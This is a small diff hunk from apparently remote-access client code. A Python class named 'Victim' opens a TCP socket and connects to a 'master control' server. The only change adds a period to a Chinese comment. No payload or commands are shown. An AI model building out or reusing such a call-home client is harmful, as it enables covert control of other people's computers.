@@ -12,7 +12,7 @@ class Victim:
         self.serverIP = ip
         self.serverPort = port
         self.serverAddr = (self.serverIP, self.serverPort)
-        # 连接主控端
+        # 连接主控端.
         self.victimSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.victimSocket.connect(self.serverAddr)
 
